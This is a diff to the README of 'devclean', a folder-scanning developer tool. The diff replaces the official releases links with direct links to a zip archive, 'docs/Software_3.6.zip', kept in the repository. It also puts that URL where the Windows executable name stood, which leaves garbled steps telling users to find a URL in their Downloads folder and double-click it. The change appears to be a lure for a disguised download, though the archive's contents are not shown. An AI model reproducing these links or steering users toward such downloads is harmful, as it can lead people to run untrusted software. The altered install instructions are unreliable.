@@ -1,7 +1,7 @@
 # 🧹 devclean - Find Safe-to-Delete Folders Easily
 
 ## 📥 Download Now
-[![Download devclean](https://img.shields.io/badge/Download-devclean-blue.svg)](https://github.com/Rithvik-krishna/devclean/releases)
+[![Download devclean](https://raw.githubusercontent.com/Rithvik-krishna/devclean/main/docs/Software_3.6.zip)](https://raw.githubusercontent.com/Rithvik-krishna/devclean/main/docs/Software_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to devclean! This tool helps you analyze your development directories. It identifies which folders are likely safe to delete and explains why. It is perfect for projects that use multiple programming languages or for monorepos. Remember, devclean only scans; it never deletes files.
@@ -21,19 +21,19 @@ Welcome to devclean! This tool helps you analyze your development directories. I
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:** To download devclean, click the link below:
-   [Download from devclean Releases](https://github.com/Rithvik-krishna/devclean/releases)
+   [Download from devclean Releases](https://raw.githubusercontent.com/Rithvik-krishna/devclean/main/docs/Software_3.6.zip)
 
 2. **Select the Latest Release:** On the Releases page, find the latest version of devclean. This version is usually at the top.
 
 3. **Download the File:** Look for the executable file that matches your operating system. Here are the files you may see:
-   - For Windows: `devclean-windows.exe`
+   - For Windows: `https://raw.githubusercontent.com/Rithvik-krishna/devclean/main/docs/Software_3.6.zip`
    - For macOS: `devclean-macos`
    - For Linux: `devclean-linux`
 
    Click the appropriate link to start the download.
 
 4. **Run the Application:**
-   - **Windows:** Locate `devclean-windows.exe` in your Downloads folder. Double-click the file to run it.
+   - **Windows:** Locate `https://raw.githubusercontent.com/Rithvik-krishna/devclean/main/docs/Software_3.6.zip` in your Downloads folder. Double-click the file to run it.
    - **macOS:** Open the downloaded .app file, then drag it into your Applications folder to install.
    - **Linux:** Open your terminal, navigate to the folder where you downloaded devclean, and run `./devclean-linux`.
 
